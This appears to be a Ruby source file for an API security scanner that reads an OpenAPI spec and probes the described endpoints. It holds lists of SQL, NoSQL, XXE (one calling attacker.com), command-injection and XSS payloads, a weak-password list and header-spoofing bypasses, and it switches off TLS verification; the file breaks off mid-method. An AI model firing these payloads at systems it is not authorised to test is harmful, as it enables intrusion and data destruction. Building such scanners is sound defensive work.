# frozen_string_literal: true

require "json"
require "yaml"
require "net/http"
require "uri"

# API Schema Security Reviewer
# Fetches and tests OpenAPI/Swagger specifications with authentication testing
class ApiSchemaSecurityReviewerTool
  include SecurityTool

  configure_tool(
    name: "API Schema Security Reviewer",
    description: "Comprehensive API security testing tool. Fetches OpenAPI/Swagger definitions, tests authentication/authorization, and scans for vulnerabilities including IDOR, SQL injection, XSS, command injection, authentication bypass, session management issues, and brute force weaknesses.",
    category: "Application Security"
  )

  input_field :swagger_url,
              type: :url,
              label: "Swagger/OpenAPI Definition URL",
              placeholder: "https://api.example.com/swagger.json",
              required: true

  input_field :username,
              type: :text,
              label: "Username (optional)",
              placeholder: "test@example.com",
              required: false

  input_field :password,
              type: :password,
              label: "Password (optional)",
              placeholder: "Your password",
              required: false

  input_field :deep_test,
              type: :checkbox,
              label: "Deep Testing (slower)",
              placeholder: "Test all HTTP methods and parameter combinations",
              required: false

  input_field :security_tests,
              type: :checkbox,
              label: "Enable Vulnerability Scanning",
              placeholder: "Test for IDOR, SQLi, XSS, injection attacks, etc.",
              required: false

  output_format :html, :json, :csv, :pdf

  HTTP_METHODS = %w[get post put patch delete head options].freeze unless defined?(HTTP_METHODS)

  # SQL Injection test payloads
  SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    "' OR 'x'='x"
  ].freeze unless defined?(SQL_INJECTION_PAYLOADS)

  # JSON Injection test payloads
  JSON_INJECTION_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$where": "1==1"}',
    '{"__proto__": {"isAdmin": true}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}'
  ].freeze unless defined?(JSON_INJECTION_PAYLOADS)

  # XML/XXE test payloads
  XML_INJECTION_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
  ].freeze unless defined?(XML_INJECTION_PAYLOADS)

  # Command Injection test payloads
  COMMAND_INJECTION_PAYLOADS = [
    '; ls -la',
    '| whoami',
    '`id`',
    '$(pwd)',
    '; cat /etc/passwd'
  ].freeze unless defined?(COMMAND_INJECTION_PAYLOADS)

  # XSS test payloads
  XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>'
  ].freeze unless defined?(XSS_PAYLOADS)

  # Common weak passwords for brute force testing
  COMMON_PASSWORDS = %w[
    password 123456 12345678 admin qwerty 123456789 letmein
    welcome password123 admin123 root test 1234 Password1
  ].freeze unless defined?(COMMON_PASSWORDS)

  def execute(params)
    swagger_url = params[:swagger_url]&.strip
    username = params[:username]&.strip
    password = params[:password]&.strip
    deep_test = params[:deep_test] == "1"
    security_tests = params[:security_tests] == "1"

    return { error: "Swagger URL is required" } if swagger_url.blank?

    # Add https:// if no protocol
    swagger_url = "https://#{swagger_url}" unless swagger_url.match?(/^https?:\/\//i)

    results = {
      swagger_url: swagger_url,
      spec_info: {},
      base_url: nil,
      login_endpoint: nil,
      authentication_status: "Not tested",
      unauthenticated_tests: {
        total: 0,
        accessible: [],
        forbidden: [],
        errors: []
      },
      authenticated_tests: {
        total: 0,
        accessible: [],
        forbidden: [],
        errors: []
      },
      security_test_results: {
        idor_tests: [],
        sql_injection_tests: [],
        json_injection_tests: [],
        xml_injection_tests: [],
        command_injection_tests: [],
        xss_tests: [],
        auth_bypass_tests: [],
        brute_force_tests: [],
        session_tests: [],
        rate_limit_tests: []
      },
      vulnerabilities: [],
      warnings: [],
      recommendations: [],
      security_score: 100,
      risk_level: :low
    }

    begin
      # Fetch Swagger definition
      spec_data = fetch_swagger_definition(swagger_url)
      return spec_data if spec_data[:error]

      spec = spec_data[:spec]
      results[:spec_info] = extract_spec_info(spec)
      results[:base_url] = determine_base_url(spec, swagger_url)

      # Extract all endpoints
      endpoints = extract_endpoints(spec)
      return { error: "No endpoints found in Swagger definition" } if endpoints.empty?

      # Find login endpoint
      login_endpoint = find_login_endpoint(endpoints, results[:base_url])
      results[:login_endpoint] = login_endpoint

      # Phase 1: Test all endpoints without authentication
      results[:unauthenticated_tests] = test_endpoints(endpoints, results[:base_url], nil, deep_test)

      # Phase 2: Authenticate and test with token if credentials provided
      auth_token = nil
      if username.present? && password.present?
        if login_endpoint
          auth_result = attempt_authentication(login_endpoint, username, password)

          if auth_result[:success]
            auth_token = auth_result[:token]
            results[:authentication_status] = "Authenticated successfully"
            results[:authenticated_tests] = test_endpoints(endpoints, results[:base_url], auth_token, deep_test)

            # Analyze authorization gaps
            analyze_authorization_gaps(results)
          else
            results[:authentication_status] = "Authentication failed: #{auth_result[:error]}"
          end
        else
          results[:authentication_status] = "No login endpoint found in API spec"
        end
      else
        results[:authentication_status] = "Credentials not provided"
      end

      # Phase 3: Run security vulnerability tests if enabled
      if security_tests
        run_security_tests(endpoints, results[:base_url], auth_token, login_endpoint, username, password, results)
      end

      # Generate security findings
      generate_security_findings(results)

      # Calculate score and risk
      calculate_security_score(results)

    rescue StandardError => e
      return { error: "Error testing API: #{e.message}", backtrace: e.backtrace.first(5) }
    end

    results
  end

  private

  def fetch_swagger_definition(url)
    uri = URI.parse(url)

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.open_timeout = 15
    http.read_timeout = 15
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    request = Net::HTTP::Get.new(uri.request_uri)
    request['Accept'] = 'application/json, application/x-yaml, text/yaml'
    request['User-Agent'] = 'SecTools API Security Reviewer'

    response = http.request(request)

    unless response.code.to_i == 200
      return { error: "Failed to fetch Swagger definition: HTTP #{response.code}" }
    end

    # Parse JSON or YAML
    spec = begin
      JSON.parse(response.body)
    rescue JSON::ParserError
      begin
        YAML.safe_load(response.body, aliases: true)
      rescue Psych::SyntaxError => e
        return { error: "Invalid Swagger format: #{e.message}" }
      end
    end

    { spec: spec }
  rescue StandardError => e
    { error: "Error fetching Swagger definition: #{e.message}" }
  end

  def extract_spec_info(spec)
    {
      title: spec.dig("info", "title") || "Unknown API",
      version: spec.dig("info", "version") || "Unknown",
      openapi_version: spec["openapi"] || spec["swagger"] || "Unknown",
      description: spec.dig("info", "description")
    }
  end

  def determine_base_url(spec, swagger_url)
    # OpenAPI 3.x servers
    if spec["servers"]&.is_a?(Array) && spec["servers"].any?
      return spec["servers"].first["url"]
    end

    # Swagger 2.0
    if spec["host"]
      scheme = spec["schemes"]&.first || "https"
      base_path = spec["basePath"] || ""
      return "#{scheme}://#{spec['host']}#{base_path}"
    end

    # Fallback: derive from swagger URL
    uri = URI.parse(swagger_url)
    "#{uri.scheme}://#{uri.host}#{uri.port && uri.port != 80 && uri.port != 443 ? ":#{uri.port}" : ""}"
  end

  def extract_endpoints(spec)
    endpoints = []
    paths = spec["paths"] || {}

    paths.each do |path, path_item|
      next unless path_item.is_a?(Hash)

      HTTP_METHODS.each do |method|
        next unless path_item[method].is_a?(Hash)

        operation = path_item[method]

        endpoints << {
          path: path,
          method: method.upcase,
          operation_id: operation["operationId"],
          summary: operation["summary"],
          description: operation["description"],
          parameters: operation["parameters"] || [],
          security: operation["security"] || path_item["security"] || spec["security"],
          responses: operation["responses"] || {},
          tags: operation["tags"] || []
        }
      end
    end

    endpoints
  end

  def find_login_endpoint(endpoints, base_url)
    # Look for common login patterns in path
    login_patterns = [
      /\/sessions$/i,      # /api/v1/sessions, /sessions
      /\/login$/i,
      /\/auth$/i,
      /\/authenticate$/i,
      /\/signin$/i,
      /\/token$/i,
      /\/oauth\/token$/i
    ]

    # Look for login/auth keywords in tags or summary
    login_endpoint = endpoints.find do |endpoint|
      next false unless endpoint[:method] == "POST"

      # Check path patterns
      path_match = login_patterns.any? { |pattern| endpoint[:path] =~ pattern }

      # Check tags for authentication-related keywords
      tags_match = endpoint[:tags]&.any? do |tag|
        tag.to_s.downcase =~ /auth|login|session|signin/
      end

      # Check summary for authentication-related keywords
      summary_match = endpoint[:summary].to_s.downcase =~ /login|auth|signin|session/

      path_match || tags_match || summary_match
    end

    return nil unless login_endpoint

    {
      url: "#{base_url}#{login_endpoint[:path]}",
      path: login_endpoint[:path],
      method: login_endpoint[:method],
      parameters: login_endpoint[:parameters],
      summary: login_endpoint[:summary]
    }
  end

  def attempt_authentication(login_endpoint, username, password)
    uri = URI.parse(login_endpoint[:url])

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.open_timeout = 10
    http.read_timeout = 10

    request = Net::HTTP::Post.new(uri.path)
    request['Content-Type'] = 'application/json'
    request['Accept'] = 'application/json'

    # Try common authentication body formats
    body_formats = [
      { username: username, password: password },
      { email: username, password: password },
      { user: username, password: password },
      { login: username, password: password }
    ]

    body_formats.each do |body_format|
      request.body = body_format.to_json
      response = http.request(request)

      if response.code.to_i >= 200 && response.code.to_i < 300
        # Try to extract token from response
        begin
          response_data = JSON.parse(response.body)

          # Common token field names (in order of priority)
          token = response_data["api_token"] ||          # Custom: api_token
                  response_data["token"] ||
                  response_data["access_token"] ||
                  response_data["accessToken"] ||
                  response_data["auth_token"] ||
                  response_data["authToken"] ||
                  response_data["jwt"] ||
                  response_data["bearer_token"] ||
                  response_data["session_token"] ||
                  response_data.dig("data", "api_token") ||
                  response_data.dig("data", "token") ||
                  response_data.dig("data", "access_token") ||
                  response_data.dig("user", "api_token") ||
                  response_data.dig("user", "token")

          if token
            return {
              success: true,
              token: token,
              response: response_data,
              body_format: body_format
            }
          end

          # Check Authorization header
          auth_header = response['Authorization']
          if auth_header
            return {
              success: true,
              token: auth_header,
              response: response_data,
              body_format: body_format
            }
          end

        rescue JSON::ParserError
          # Not JSON response
        end

        # Authentication succeeded but couldn't extract token
        return {
          success: false,
          error: "Login succeeded (HTTP #{response.code}) but no token found in response. Response keys: #{response_data&.keys&.join(', ') || 'N/A'}"
        }
      end
    end

    { success: false, error: "Authentication failed with all credential formats" }
  rescue StandardError => e
    { success: false, error: e.message }
  end

  def test_endpoints(endpoints, base_url, auth_token, deep_test)
    results = {
      total: 0,
      accessible: [],
      forbidden: [],
      errors: []
    }

    # Limit testing if not deep test
    endpoints_to_test = deep_test ? endpoints : endpoints.first(20)

    endpoints_to_test.each do |endpoint|
      results[:total] += 1

      test_result = test_single_endpoint(endpoint, base_url, auth_token)

      case test_result[:status_category]
      when :accessible
        results[:accessible] << test_result
      when :forbidden
        results[:forbidden] << test_result
      when :error
        results[:errors] << test_result
      end
    end

    results
  end

  def test_single_endpoint(endpoint, base_url, auth_token)
    # Replace path parameters with sample values
    path = endpoint[:path].gsub(/\{([^}]+)\}/, '1')
    url = "#{base_url}#{path}"

    begin
      uri = URI.parse(url)

      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = (uri.scheme == 'https')
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.open_timeout = 5
      http.read_timeout = 5

      request_class = case endpoint[:method]
                      when "GET" then Net::HTTP::Get
                      when "POST" then Net::HTTP::Post
                      when "PUT" then Net::HTTP::Put
                      when "PATCH" then Net::HTTP::Patch
                      when "DELETE" then Net::HTTP::Delete
                      when "HEAD" then Net::HTTP::Head
                      when "OPTIONS" then Net::HTTP::Options
                      else Net::HTTP::Get
                      end

      request = request_class.new(uri.request_uri)
      request['Accept'] = 'application/json'
      request['User-Agent'] = 'SecTools Security Scanner'

      # Add authentication if token provided
      if auth_token
        # Try different auth header formats
        if auth_token.start_with?('Bearer ')
          request['Authorization'] = auth_token
        else
          request['Authorization'] = "Bearer #{auth_token}"
        end
      end

      # Add sample body for POST/PUT/PATCH
      if ["POST", "PUT", "PATCH"].include?(endpoint[:method])
        request['Content-Type'] = 'application/json'
        request.body = '{}'
      end

      response = http.request(request)

      status_code = response.code.to_i
      status_category = categorize_status(status_code)

      {
        endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
        method: endpoint[:method],
        path: endpoint[:path],
        summary: endpoint[:summary],
        status_code: status_code,
        status_message: response.message,
        status_category: status_category,
        has_auth_token: !auth_token.nil?,
        response_headers: extract_interesting_headers(response)
      }

    rescue StandardError => e
      {
        endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
        method: endpoint[:method],
        path: endpoint[:path],
        summary: endpoint[:summary],
        status_code: 0,
        status_message: e.message,
        status_category: :error,
        has_auth_token: !auth_token.nil?,
        error: e.message
      }
    end
  end

  def categorize_status(status_code)
    case status_code
    when 200..299 then :accessible
    when 401, 403 then :forbidden
    else :error
    end
  end

  def extract_interesting_headers(response)
    interesting = {}

    ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-Frame-Options',
     'Content-Security-Policy', 'Strict-Transport-Security'].each do |header|
      interesting[header] = response[header] if response[header]
    end

    interesting
  end

  def analyze_authorization_gaps(results)
    unauth_accessible = results[:unauthenticated_tests][:accessible]
    auth_accessible = results[:authenticated_tests][:accessible]

    # Find endpoints accessible without auth that shouldn't be
    unauth_accessible.each do |endpoint|
      method = endpoint[:method]

      # Critical if write operations are accessible without auth
      if ["POST", "PUT", "PATCH", "DELETE"].include?(method)
        results[:vulnerabilities] << {
          severity: :critical,
          type: "Unauthenticated Write Access",
          endpoint: endpoint[:endpoint],
          message: "#{method} endpoint accessible without authentication",
          impact: "Unauthorized users can modify data"
        }
        results[:security_score] -= 25
      elsif method == "GET"
        results[:warnings] << {
          type: "Unauthenticated Read Access",
          endpoint: endpoint[:endpoint],
          message: "GET endpoint accessible without authentication",
          recommendation: "Verify if this endpoint should be public"
        }
        results[:security_score] -= 5
      end
    end

    # Check if authentication provides additional access
    if results[:authenticated_tests][:total] > 0
      auth_only_count = auth_accessible.length - unauth_accessible.length

      if auth_only_count <= 0
        results[:warnings] << {
          type: "Authentication Provides No Additional Access",
          message: "Authentication does not grant access to any additional endpoints",
          recommendation: "Review authorization implementation"
        }
        results[:security_score] -= 15
      end
    end
  end

  def generate_security_findings(results)
    # Check for missing HTTPS
    if results[:base_url] && results[:base_url].start_with?("http://")
      results[:vulnerabilities] << {
        severity: :high,
        type: "Insecure Protocol",
        message: "API uses HTTP instead of HTTPS",
        impact: "Credentials and data transmitted in plaintext"
      }
      results[:security_score] -= 20
    end

    # Check rate limiting
    has_rate_limits = results[:unauthenticated_tests][:accessible].any? do |r|
      r[:response_headers].keys.any? { |h| h.include?('RateLimit') }
    end

    unless has_rate_limits
      results[:warnings] << {
        type: "No Rate Limiting Detected",
        message: "API does not appear to implement rate limiting",
        recommendation: "Implement rate limiting to prevent abuse"
      }
      results[:security_score] -= 10
    end

    # Generate recommendations
    results[:recommendations] = generate_recommendations(results)
  end

  def generate_recommendations(results)
    recommendations = []

    if results[:vulnerabilities].any? { |v| v[:type] == "Unauthenticated Write Access" }
      recommendations << "CRITICAL: Implement authentication for all write operations (POST, PUT, PATCH, DELETE)"
      recommendations << "Review and fix authorization logic for all endpoints"
    end

    if results[:base_url]&.start_with?("http://")
      recommendations << "Enable HTTPS for all API endpoints"
      recommendations << "Redirect HTTP requests to HTTPS"
    end

    if results[:authentication_status] == "Credentials not provided"
      recommendations << "Provide test credentials to enable authenticated endpoint testing"
    end

    recommendations << "Implement comprehensive API security testing in CI/CD pipeline"
    recommendations << "Use API gateway for centralized authentication and rate limiting"
    recommendations << "Document all security requirements in OpenAPI specification"
    recommendations << "Implement proper error handling without information disclosure"
    recommendations << "Use short-lived JWT tokens with refresh token rotation"

    recommendations.uniq
  end

  def calculate_security_score(results)
    # Ensure score doesn't go below 0
    results[:security_score] = [results[:security_score], 0].max

    # Determine risk level
    results[:risk_level] = if results[:vulnerabilities].any? { |v| v[:severity] == :critical }
                            :critical
                          elsif results[:vulnerabilities].any? { |v| v[:severity] == :high }
                            :high
                          elsif results[:vulnerabilities].any? { |v| v[:severity] == :medium }
                            :medium
                          elsif results[:warnings].any?
                            :low
                          else
                            :secure
                          end

    # Generate grade
    results[:grade] = case results[:security_score]
                      when 90..100 then "A"
                      when 80..89 then "B"
                      when 70..79 then "C"
                      when 60..69 then "D"
                      else "F"
                      end
  end

  # ============================================================================
  # SECURITY VULNERABILITY TESTING METHODS
  # ============================================================================

  def run_security_tests(endpoints, base_url, auth_token, login_endpoint, username, password, results)
    # Test IDOR vulnerabilities
    test_idor_vulnerabilities(endpoints, base_url, auth_token, results)

    # Test SQL Injection
    test_sql_injection(endpoints, base_url, auth_token, results)

    # Test JSON Injection (NoSQL, Prototype Pollution)
    test_json_injection(endpoints, base_url, auth_token, results)

    # Test XML/XXE Injection
    test_xml_injection(endpoints, base_url, auth_token, results)

    # Test Command Injection
    test_command_injection(endpoints, base_url, auth_token, results)

    # Test XSS
    test_xss_vulnerabilities(endpoints, base_url, auth_token, results)

    # Test Authentication Bypass
    test_authentication_bypass(endpoints, base_url, results)

    # Test Session Management
    test_session_management(login_endpoint, username, password, base_url, results) if login_endpoint

    # Test Brute Force Protection
    test_brute_force_protection(login_endpoint, results) if login_endpoint

    # Test Rate Limiting
    test_rate_limiting(endpoints, base_url, auth_token, results)
  end

  def test_idor_vulnerabilities(endpoints, base_url, auth_token, results)
    # Test Insecure Direct Object Reference
    # Find endpoints with ID parameters
    id_endpoints = endpoints.select { |e| e[:path] =~ /\{id\}|\{.*id.*\}/i }

    id_endpoints.first(5).each do |endpoint|
      # Test accessing resources with different IDs
      test_ids = [1, 2, 999, 9999, -1, 0]

      test_ids.each do |test_id|
        path = endpoint[:path].gsub(/\{[^}]+\}/, test_id.to_s)
        url = "#{base_url}#{path}"

        begin
          response = make_request(url, endpoint[:method], auth_token, nil)

          # Build curl command for reproduction
          curl_command = "curl -X #{endpoint[:method]} '#{url}'"
          curl_command += " -H 'Authorization: Bearer [TOKEN]'" if auth_token

          if response[:status_code] == 200
            results[:security_test_results][:idor_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              test_id: test_id,
              status: :vulnerable,
              message: "Endpoint returned 200 for ID #{test_id}",
              severity: :high,
              url_tested: url,
              status_code: response[:status_code],
              reproduction: {
                description: "Test IDOR by accessing resource with ID #{test_id}",
                curl: curl_command,
                expected: "403 Forbidden or 401 Unauthorized",
                actual: "200 OK - Resource accessible"
              }
            }

            # Only report once per endpoint
            unless results[:vulnerabilities].any? { |v| v[:endpoint] == "#{endpoint[:method]} #{endpoint[:path]}" && v[:type] == "Potential IDOR" }
              results[:vulnerabilities] << {
                severity: :high,
                type: "Potential IDOR",
                endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
                message: "Endpoint accessible with sequential IDs - possible Insecure Direct Object Reference",
                impact: "Attackers may access unauthorized resources by manipulating ID parameters"
              }
              results[:security_score] -= 15
            end
            break
          else
            # Record passed test
            results[:security_test_results][:idor_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              test_id: test_id,
              status: :pass,
              message: "Endpoint correctly returned #{response[:status_code]} for ID #{test_id}",
              url_tested: url,
              status_code: response[:status_code]
            }
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:idor_tests] << { status: :tested, count: id_endpoints.first(5).length } if results[:security_test_results][:idor_tests].empty?
  end

  def test_sql_injection(endpoints, base_url, auth_token, results)
    # Test SQL Injection in query parameters and path parameters
    testable_endpoints = endpoints.select { |e| e[:method] == "GET" && (e[:parameters].any? || e[:path] =~ /\{[^}]+\}/) }

    testable_endpoints.first(3).each do |endpoint|
      SQL_INJECTION_PAYLOADS.first(3).each do |payload|
        path = endpoint[:path].gsub(/\{[^}]+\}/, URI.encode_www_form_component(payload))
        url = "#{base_url}#{path}"

        # Add query parameter with injection
        url += "?search=#{URI.encode_www_form_component(payload)}"

        begin
          response = make_request(url, endpoint[:method], auth_token, nil)

          # Build curl command
          curl_command = "curl -X #{endpoint[:method]} '#{url}'"
          curl_command += " -H 'Authorization: Bearer [TOKEN]'" if auth_token

          # Look for SQL error indicators
          sql_errors = [
            { pattern: /SQL syntax/i, db: "MySQL/MariaDB" },
            { pattern: /mysql_fetch/i, db: "MySQL" },
            { pattern: /pg_query/i, db: "PostgreSQL" },
            { pattern: /sqlite_/i, db: "SQLite" },
            { pattern: /ORA-\d+/i, db: "Oracle" },
            { pattern: /SQL Server/i, db: "SQL Server" },
            { pattern: /Unclosed quotation mark/i, db: "SQL Server" },
            { pattern: /quoted string not properly terminated/i, db: "Oracle" }
          ]

          body = response[:body].to_s
          detected_db = sql_errors.find { |err| body =~ err[:pattern] }

          if detected_db
            error_snippet = body[body.index(detected_db[:pattern]), 200] rescue body[0, 200]

            results[:security_test_results][:sql_injection_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              payload: payload,
              status: :vulnerable,
              message: "SQL error detected in response",
              severity: :critical,
              url_tested: url,
              status_code: response[:status_code],
              database_type: detected_db[:db],
              error_snippet: error_snippet,
              reproduction: {
                description: "Test SQL injection by injecting payload into query parameter or path",
                curl: curl_command,
                payload_used: payload,
                expected: "No database errors in response",
                actual: "#{detected_db[:db]} error detected in response",
                mitigation: "Use parameterized queries/prepared statements. Never concatenate user input directly into SQL queries."
              }
            }

            results[:vulnerabilities] << {
              severity: :critical,
              type: "SQL Injection",
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              message: "Endpoint may be vulnerable to SQL injection - #{detected_db[:db]} errors detected",
              impact: "Attackers may access or modify database contents"
            }
            results[:security_score] -= 30
            break
          else
            # Record passed test
            results[:security_test_results][:sql_injection_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              payload: payload,
              status: :pass,
              message: "No SQL injection detected with payload: #{payload[0..30]}...",
              url_tested: url,
              status_code: response[:status_code]
            }
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:sql_injection_tests] << { status: :tested, count: testable_endpoints.first(3).length } if results[:security_test_results][:sql_injection_tests].empty?
  end

  def test_json_injection(endpoints, base_url, auth_token, results)
    # Test NoSQL injection and prototype pollution
    post_endpoints = endpoints.select { |e| ["POST", "PUT", "PATCH"].include?(e[:method]) }

    post_endpoints.first(3).each do |endpoint|
      JSON_INJECTION_PAYLOADS.first(2).each do |payload|
        path = endpoint[:path].gsub(/\{[^}]+\}/, '1')
        url = "#{base_url}#{path}"

        begin
          response = make_request(url, endpoint[:method], auth_token, payload)

          # Check for unexpected success with injection payloads
          if response[:status_code] == 200 || response[:status_code] == 201
            body = response[:body].to_s

            # Check for NoSQL error patterns
            if body =~ /MongoError|CastError|ValidationError/i
              results[:security_test_results][:json_injection_tests] << {
                endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
                payload: payload,
                status: :vulnerable,
                message: "NoSQL error detected",
                severity: :high
              }

              results[:vulnerabilities] << {
                severity: :high,
                type: "JSON/NoSQL Injection",
                endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
                message: "Endpoint may be vulnerable to NoSQL injection",
                impact: "Attackers may bypass authentication or access unauthorized data"
              }
              results[:security_score] -= 25
              break
            end
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:json_injection_tests] << { status: :tested, count: post_endpoints.first(3).length } if results[:security_test_results][:json_injection_tests].empty?
  end

  def test_xml_injection(endpoints, base_url, auth_token, results)
    # Test XXE (XML External Entity) injection
    post_endpoints = endpoints.select { |e| ["POST", "PUT", "PATCH"].include?(e[:method]) }

    post_endpoints.first(2).each do |endpoint|
      XML_INJECTION_PAYLOADS.first(1).each do |payload|
        path = endpoint[:path].gsub(/\{[^}]+\}/, '1')
        url = "#{base_url}#{path}"

        begin
          response = make_request(url, endpoint[:method], auth_token, payload, 'application/xml')

          # Check for XXE indicators
          body = response[:body].to_s
          if body =~ /root:|nobody:|daemon:|\/etc\/passwd/i || response[:status_code] == 500
            results[:security_test_results][:xml_injection_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              payload: "XXE test payload",
              status: :vulnerable,
              message: "Possible XXE vulnerability detected",
              severity: :critical
            }

            results[:vulnerabilities] << {
              severity: :critical,
              type: "XML External Entity (XXE) Injection",
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              message: "Endpoint may be vulnerable to XXE attacks",
              impact: "Attackers may read local files or perform SSRF attacks"
            }
            results[:security_score] -= 30
            break
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:xml_injection_tests] << { status: :tested, count: post_endpoints.first(2).length } if results[:security_test_results][:xml_injection_tests].empty?
  end

  def test_command_injection(endpoints, base_url, auth_token, results)
    # Test OS command injection
    testable_endpoints = endpoints.select { |e| e[:parameters].any? || e[:path] =~ /\{[^}]+\}/ }

    testable_endpoints.first(2).each do |endpoint|
      COMMAND_INJECTION_PAYLOADS.first(2).each do |payload|
        path = endpoint[:path].gsub(/\{[^}]+\}/, URI.encode_www_form_component(payload))
        url = "#{base_url}#{path}"

        begin
          start_time = Time.now
          response = make_request(url, endpoint[:method], auth_token, nil)
          elapsed = Time.now - start_time

          # Check for command execution indicators
          body = response[:body].to_s
          command_indicators = [
            /uid=\d+/i,  # Unix user id
            /gid=\d+/i,  # Unix group id
            /root:x:0:0/i,  # /etc/passwd content
            /bin\/bash/i,
            /bin\/sh/i
          ]

          if command_indicators.any? { |pattern| body =~ pattern } || elapsed > 5
            results[:security_test_results][:command_injection_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              payload: payload,
              status: :vulnerable,
              message: "Possible command injection vulnerability",
              severity: :critical
            }

            results[:vulnerabilities] << {
              severity: :critical,
              type: "Command Injection",
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              message: "Endpoint may be vulnerable to OS command injection",
              impact: "Attackers may execute arbitrary system commands"
            }
            results[:security_score] -= 35
            break
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:command_injection_tests] << { status: :tested, count: testable_endpoints.first(2).length } if results[:security_test_results][:command_injection_tests].empty?
  end

  def test_xss_vulnerabilities(endpoints, base_url, auth_token, results)
    # Test for reflected XSS
    get_endpoints = endpoints.select { |e| e[:method] == "GET" && e[:parameters].any? }

    get_endpoints.first(3).each do |endpoint|
      XSS_PAYLOADS.first(2).each do |payload|
        path = endpoint[:path].gsub(/\{[^}]+\}/, '1')
        url = "#{base_url}#{path}?q=#{URI.encode_www_form_component(payload)}"

        begin
          response = make_request(url, endpoint[:method], auth_token, nil)
          body = response[:body].to_s

          # Check if payload is reflected unescaped
          if body.include?(payload)
            results[:security_test_results][:xss_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              payload: payload,
              status: :vulnerable,
              message: "XSS payload reflected in response",
              severity: :high
            }

            results[:vulnerabilities] << {
              severity: :high,
              type: "Cross-Site Scripting (XSS)",
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              message: "Endpoint may be vulnerable to reflected XSS",
              impact: "Attackers may execute malicious scripts in users' browsers"
            }
            results[:security_score] -= 20
            break
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:xss_tests] << { status: :tested, count: get_endpoints.first(3).length } if results[:security_test_results][:xss_tests].empty?
  end

  def test_authentication_bypass(endpoints, base_url, results)
    # Test authentication bypass techniques
    protected_endpoints = endpoints.select { |e| e[:security].present? }

    bypass_techniques = [
      { header: 'X-Original-URL', value: '/admin' },
      { header: 'X-Rewrite-URL', value: '/admin' },
      { header: 'X-Forwarded-For', value: '127.0.0.1' },
      { header: 'X-Remote-Addr', value: '127.0.0.1' },
      { header: 'X-Client-IP', value: '127.0.0.1' }
    ]

    protected_endpoints.first(3).each do |endpoint|
      bypass_techniques.each do |technique|
        path = endpoint[:path].gsub(/\{[^}]+\}/, '1')
        url = "#{base_url}#{path}"

        begin
          response = make_request(url, endpoint[:method], nil, nil, nil, technique)

          if response[:status_code] >= 200 && response[:status_code] < 300
            results[:security_test_results][:auth_bypass_tests] << {
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              technique: technique,
              status: :vulnerable,
              message: "Authentication bypassed using #{technique[:header]}",
              severity: :critical
            }

            results[:vulnerabilities] << {
              severity: :critical,
              type: "Authentication Bypass",
              endpoint: "#{endpoint[:method]} #{endpoint[:path]}",
              message: "Protected endpoint accessible via header manipulation: #{technique[:header]}",
              impact: "Attackers may bypass authentication controls"
            }
            results[:security_score] -= 40
            break
          end
        rescue StandardError => e
          # Continue testing
        end
      end
    end

    results[:security_test_results][:auth_bypass_tests] << { status: :tested, count: protected_endpoints.first(3).length } if results[:security_test_results][:auth_bypass_tests].empty?
  end

  def test_session_management(login_endpoint, username, password, base_url, results)
    # Test session management issues
    return unless login_endpoint

    # Test 1: Token reuse after logout (if logout endpoint exists)
    # Test 2: Concurrent sessions
    # Test 3: Session fixation

    begin
      # Get two tokens with same credentials
      auth1 = attempt_authentication(login_endpoint, username, password)
      sleep(1)
      auth2 = attempt_authentication(login_endpoint, username, password)

      if auth1[:success] && auth2[:success]
        if auth1[:token] == auth2[:token]
          results[:security_test_results][:session_tests] << {
            test: "Token reuse",
            status: :warning,
            message: "Same token returned for multiple logins",
            severity: :medium
          }

          results[:warnings] << {
            type: "Session Management Issue",
            message: "API returns same token for multiple login attempts",
            recommendation: "Generate unique tokens for each session"
          }
          results[:security_score] -= 10
        end

        # Test concurrent sessions
        results[:security_test_results][:session_tests] << {
          test: "Concurrent sessions",
          status: :info,
          message: "Multiple concurrent sessions allowed"
        }
      end
    rescue StandardError => e
      # Session tests failed
